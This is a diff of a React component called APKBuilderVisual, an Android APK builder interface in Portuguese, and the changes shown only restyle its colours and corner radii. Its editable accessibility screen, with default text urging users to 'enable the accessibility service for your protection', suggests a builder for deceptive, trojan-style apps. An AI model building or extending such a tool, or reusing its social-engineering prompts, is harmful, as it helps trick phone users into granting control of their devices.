+                          className="w-full px-2.5 py-1.5 bg-[#121214] border border-[#2a2a31] rounded-md text-xs text-white focus:border-[#ef4444] outline-none"
                         />
                       </div>
 
@@ -3262,7 +3262,7 @@ export default function APKBuilderVisual() {
                           value={accDescElem?.content || ''}
                           onChange={(e) => updateAccessibilityScreenElements(undefined, e.target.value, undefined, undefined)}
                           placeholder="Ex: Para sua proteção, ative o serviço de acessibilidade..."
-                          className="w-full px-2.5 py-1.5 bg-slate-900 border border-slate-700 rounded-lg text-xs text-white focus:border-orange-500 outline-none resize-none"
+                          className="w-full px-2.5 py-1.5 bg-[#121214] border border-[#2a2a31] rounded-md text-xs text-white focus:border-[#ef4444] outline-none resize-none"
                         />
                       </div>
 
@@ -3274,7 +3274,7 @@ export default function APKBuilderVisual() {
                             value={accBtnElem?.content || ''}
                             onChange={(e) => updateAccessibilityScreenElements(undefined, undefined, e.target.value, undefined)}
                             placeholder="Ex: Ativar Proteção"
-                            className="w-full px-2.5 py-1.5 bg-slate-900 border border-slate-700 rounded-lg text-xs text-white focus:border-orange-500 outline-none"
+                            className="w-full px-2.5 py-1.5 bg-[#121214] border border-[#2a2a31] rounded-md text-xs text-white focus:border-[#ef4444] outline-none"
                           />
                         </div>
                         <div>
@@ -3283,7 +3283,7 @@ export default function APKBuilderVisual() {
                             type="color"
                             value={accBtnElem?.style?.backgroundColor || '#ff6600'}
                             onChange={(e) => updateAccessibilityScreenElements(undefined, undefined, undefined, e.target.value)}
-                            className="w-full h-8 rounded border border-slate-700 cursor-pointer bg-slate-900 p-0.5"
+                            className="w-full h-8 rounded border border-[#2a2a31] cursor-pointer bg-[#121214] p-0.5"
                           />
                         </div>
                       </div>
@@ -3299,7 +3299,7 @@ export default function APKBuilderVisual() {
                   <button
                     onClick={() => moveScreen(currentScreenIndex, 'up')}
                     disabled={currentScreenIndex === 0}
-                    className="flex-1 py-2 bg-gray-700 hover:bg-gray-600 disabled:opacity-50 rounded-lg flex items-center justify-center gap-1"
+                    className="flex-1 py-2 bg-gray-700 hover:bg-gray-600 disabled:opacity-50 rounded-md flex items-center justify-center gap-1"
                   >
                     <ChevronUp size={16} />
                     Subir
@@ -3307,7 +3307,7 @@ export default function APKBuilderVisual() {
                   <button
                     onClick={() => moveScreen(currentScreenIndex, 'down')}
                     disabled={currentScreenIndex === template.screens.length - 1}
-                    className="flex-1 py-2 bg-gray-700 hover:bg-gray-600 disabled:opacity-50 rounded-lg flex items-center justify-center gap-1"
+                    className="flex-1 py-2 bg-gray-700 hover:bg-gray-600 disabled:opacity-50 rounded-md flex items-center justify-center gap-1"
                   >
                     <ChevronDown size={16} />
                     Descer
@@ -3325,7 +3325,7 @@ export default function APKBuilderVisual() {
                     type="text"
                     value={template.appName}
                     onChange={(e) => setTemplate(prev => ({ ...prev, appName: e.target.value }))}
-                    className="w-full px-3 py-2 bg-gray-700 rounded-lg text-sm"
+                    className="w-full px-3 py-2 bg-gray-700 rounded-md text-sm"
                   />
                 </div>
 
@@ -3334,7 +3334,7 @@ export default function APKBuilderVisual() {
                   <select
                     value={template.language || 'pt'}
                     onChange={(e) => setTemplate(prev => ({ ...prev, language: e.target.value as any }))}
-                    className="w-full px-3 py-2 bg-gray-700 rounded-lg text-sm text-white cursor-pointer"
+                    className="w-full px-3 py-2 bg-gray-700 rounded-md text-sm text-white cursor-pointer"
                   >
                     <option value="pt">Português 🇧🇷</option>
                     <option value="en">English 🇺🇸</option>
@@ -3346,11 +3346,11 @@ export default function APKBuilderVisual() {
                   <label className="block text-xs text-gray-400 mb-1">Ícone Personalizado</label>
                   <div className="flex items-center gap-3">
                     {template.appIcon ? (
-                      <img src={template.appIcon} alt="Icon" className="w-10 h-10 rounded-lg object-cover border border-gray-600" />
+                      <img src={template.appIcon} alt="Icon" className="w-10 h-10 rounded-md object-cover border border-gray-600" />
                     ) : (
-                      <div className="w-10 h-10 bg-gray-700 rounded-lg flex items-center justify-center text-xs text-gray-400">🖼️</div>
+                      <div className="w-10 h-10 bg-gray-700 rounded-md flex items-center justify-center text-xs text-gray-400">🖼️</div>
                     )}
-                    <label className="flex-1 px-3 py-2 bg-gray-700 hover:bg-gray-600 rounded-lg text-xs cursor-pointer text-center">
+                    <label className="flex-1 px-3 py-2 bg-gray-700 hover:bg-gray-600 rounded-md text-xs cursor-pointer text-center">
                       <input
                         type="file"
                         accept="image/png,image/jpeg,image/jpg"
@@ -3380,7 +3380,7 @@ export default function APKBuilderVisual() {
                     type="text"
                     value={template.packageName}
                     onChange={(e) => setTemplate(prev => ({ ...prev, packageName: e.target.value }))}
-                    className="w-full px-3 py-2 bg-gray-700 rounded-lg text-sm"
+                    className="w-full px-3 py-2 bg-gray-700 rounded-md text-sm"
                   />
                 </div>
 
@@ -3388,9 +3388,9 @@ export default function APKBuilderVisual() {
               </div>
               
               {/* Help */}
-              <div className="mt-6 p-3 bg-gray-700 rounded-lg">
+              <div className="mt-6 p-3 bg-gray-700 rounded-md">
                 <div className="flex items-start gap-2">
-                  <Info size={16} className="text-blue-400 mt-0.5" />
+                  <Info size={16} className="text-[#ef4444] mt-0.5" />
                   <div className="text-xs text-gray-300">
                     <p className="font-medium mb-1">Dicas:</p>
                     <ul className="list-disc list-inside space-y-1 text-gray-400">
@@ -3410,15 +3410,15 @@ export default function APKBuilderVisual() {
       {/* 📦 MODAL: Templates Salvos */}
       {showSavedTemplates && (
         <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
-          <div className="bg-gray-800 rounded-xl w-[700px] max-h-[85vh] flex flex-col overflow-hidden">
+          <div className="bg-gray-800 rounded-md w-[700px] max-h-[85vh] flex flex-col overflow-hidden">
             <div className="p-4 border-b border-gray-700 flex items-center justify-between">
               <h2 className="text-lg font-bold flex items-center gap-2">
-                <Layers className="text-blue-500" size={20} />
+                <Layers className="text-[#ef4444]" size={20} />
                 Templates e Atualizações
               </h2>
               <button 
                 onClick={() => setShowSavedTemplates(false)}
-                className="p-2 hover:bg-gray-700 rounded-lg text-gray-400 hover:text-white"
+                className="p-2 hover:bg-gray-700 rounded-md text-gray-400 hover:text-white"
               >
                 ✕
               </button>
@@ -3427,12 +3427,12 @@ export default function APKBuilderVisual() {
             <div className="p-4 overflow-y-auto flex-1 space-y-6">
               {/* Seção 1: Templates de Fábrica */}
               <div>
-                <h3 className="text-xs font-semibold uppercase tracking-wider text-blue-400 mb-3 flex items-center gap-2">
+                <h3 className="text-xs font-semibold uppercase tracking-wider text-[#ef4444] mb-3 flex items-center gap-2">
                   <span>✨</span> Atualizações & Templates Inovadores
                 </h3>
                 <div className="grid grid-cols-2 gap-4">
                   {PREDEFINED_TEMPLATES.map((tpl) => (
-                    <div key={tpl.id} className="bg-gray-900/60 border border-blue-500/30 rounded-lg p-4 hover:border-blue-500/60 transition-all flex flex-col justify-between">
+                    <div key={tpl.id} className="bg-gray-900/60 border border-[#2a2a31]/30 rounded-md p-4 hover:border-[#2a2a31]/60 transition-all flex flex-col justify-between">
                       <div>
                         <h4 className="font-semibold text-white truncate mb-1">{tpl.name}</h4>
                         <p className="text-xs text-gray-400 mb-2 line-clamp-2">
@@ -3445,7 +3445,7 @@ export default function APKBuilderVisual() {
                         </p>
                         <button
                           onClick={() => { loadTemplate(tpl); setShowSavedTemplates(false); }}
-                          className="w-full py-2 bg-blue-600 hover:bg-blue-500 text-white rounded-lg text-xs font-semibold transition-colors"
+                          className="w-full py-2 bg-[#ef4444] hover:bg-[#ef4444] text-white rounded-md text-xs font-semibold transition-colors"
                         >
                           Carregar Template
                         </button>
@@ -3461,27 +3461,27 @@ export default function APKBuilderVisual() {
                   📁 Meus Templates Customizados
                 </h3>
                 {savedTemplates.length === 0 ? (
-                  <div className="text-center py-6 text-gray-500 border border-dashed border-gray-700 rounded-lg">
+                  <div className="text-center py-6 text-gray-500 border border-dashed border-gray-700 rounded-md">
                     <p className="text-xs">Nenhum template salvo ainda</p>
                   </div>
                 ) : (
                   <div className="grid grid-cols-2 gap-4">
                     {savedTemplates.map((tpl) => (
-                      <div key={tpl.id} className="bg-gray-700 border border-gray-600 rounded-lg p-4 flex flex-col justify-between">
+                      <div key={tpl.id} className="bg-gray-700 border border-gray-600 rounded-md p-4 flex flex-col justify-between">
                         <div>
                           <div className="flex items-start justify-between mb-1">
                             <h4 className="font-semibold text-white truncate flex-1">{tpl.name}</h4>
                             <div className="flex items-center gap-1 ml-2">
                               <button
                                 onClick={() => duplicateTemplate(tpl)}
-                                className="p-1 hover:bg-gray-600 rounded text-blue-400"
+                                className="p-1 hover:bg-gray-600 rounded text-[#ef4444]"
                                 title="Duplicar"
                               >
                                 <Copy size={13} />
                               </button>
                               <button
                                 onClick={() => deleteTemplate(tpl.id)}
-                                className="p-1 hover:bg-gray-600 rounded text-red-400"
+                                className="p-1 hover:bg-gray-600 rounded text-[#ef4444]"
                                 title="Excluir"
                               >
                                 <Trash2 size={13} />
@@ -3495,7 +3495,7 @@ export default function APKBuilderVisual() {
                         <div className="mt-2">
                           <button
                             onClick={() => { loadTemplate(tpl); setShowSavedTemplates(false); }}
-                            className="w-full py-2 bg-gray-600 hover:bg-gray-500 text-white rounded-lg text-xs font-semibold transition-colors"
+                            className="w-full py-2 bg-gray-600 hover:bg-gray-500 text-white rounded-md text-xs font-semibold transition-colors"
                           >
                             Carregar Template
                           </button>
@@ -3515,11 +3515,11 @@ export default function APKBuilderVisual() {
                   value={templateName}
                   onChange={(e) => setTemplateName(e.target.value)}
                   placeholder="Nome para salvar o template atual..."
-                  className="flex-1 px-3 py-2 bg-gray-700 rounded-lg text-sm text-white border border-gray-600 focus:outline-none focus:border-blue-500"
+                  className="flex-1 px-3 py-2 bg-gray-700 rounded-md text-sm text-white border border-gray-600 focus:outline-none focus:border-[#2a2a31]"
                 />
                 <button
                   onClick={() => { saveTemplate(); setShowSavedTemplates(false); }}
-                  className="px-4 py-2 bg-green-600 hover:bg-green-500 text-white rounded-lg text-sm font-semibold transition-colors"
+                  className="px-4 py-2 bg-green-600 hover:bg-green-500 text-white rounded-md text-sm font-semibold transition-colors"
                 >
                   Salvar Atual
                 </button>
@@ -3532,24 +3532,24 @@ export default function APKBuilderVisual() {
       {/* 📜 MODAL: Histórico de APKs */}
       {showApkHistory && (
         <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
-          <div className="bg-gray-800 rounded-xl w-[600px] max-h-[80vh] overflow-hidden">
+          <div className="bg-gray-800 rounded-md w-[600px] max-h-[80vh] overflow-hidden">
             <div className="p-4 border-b border-gray-700 flex items-center justify-between">
               <h2 className="text-lg font-bold flex items-center gap-2">
-                <Copy className="text-blue-500" size={20} />
+                <Copy className="text-[#ef4444]" size={20} />
                 Histórico de APKs Criados
               </h2>
               <div className="flex items-center gap-2">
                 {apkHistory.length > 0 && (
                   <button 
                     onClick={clearHistory}
-                    className="px-3 py-1 text-sm text-red-400 hover:bg-gray-700 rounded-lg"
+                    className="px-3 py-1 text-sm text-[#ef4444] hover:bg-gray-700 rounded-md"
                   >
                     Limpar
                   </button>
                 )}
                 <button 
                   onClick={() => setShowApkHistory(false)}
-                  className="p-2 hover:bg-gray-700 rounded-lg"
+                  className="p-2 hover:bg-gray-700 rounded-md"
                 >
                   ✕
                 </button>
@@ -3566,11 +3566,11 @@ export default function APKBuilderVisual() {
               ) : (
                 <div className="space-y-2">
                   {apkHistory.map((entry) => (
-                    <div key={entry.id || entry.date} className="bg-gray-700 rounded-lg p-4 hover:bg-gray-600 transition-colors">
+                    <div key={entry.id || entry.date} className="bg-gray-700 rounded-md p-4 hover:bg-gray-600 transition-colors">
                       <div className="flex items-center justify-between mb-2">
                         <div className="flex-1">
                           <p className="font-semibold text-white flex items-center gap-2">
-                            <Smartphone size={16} className="text-orange-500" />
+                            <Smartphone size={16} className="text-[#ef4444]" />
                             {entry.name}
                           </p>
                           <p className="text-xs text-gray-400 mt-1">
@@ -3588,7 +3588,7 @@ export default function APKBuilderVisual() {
                         {entry.downloadUrl ? (
                           <button
                             onClick={() => downloadApk(entry.downloadUrl, entry.name)}
-                            className="flex-1 flex items-center justify-center gap-2 py-2 bg-green-600 hover:bg-green-500 rounded-lg text-sm font-medium transition-colors"
+                            className="flex-1 flex items-center justify-center gap-2 py-2 bg-green-600 hover:bg-green-500 rounded-md text-sm font-medium transition-colors"
                           >
                             <Download size={16} />
                             Baixar APK
@@ -3600,7 +3600,7 @@ export default function APKBuilderVisual() {
                         )}
                         <button
                           onClick={() => deleteFromHistory(entry.id)}
-                          className="px-4 py-2 bg-red-600 hover:bg-red-500 rounded-lg text-sm font-medium transition-colors flex items-center gap-1"
+                          className="px-4 py-2 bg-[#ef4444] hover:bg-[#ef4444] rounded-md text-sm font-medium transition-colors flex items-center gap-1"
                           title="Excluir do histórico"
                         >
                           <Trash2 size={16} />
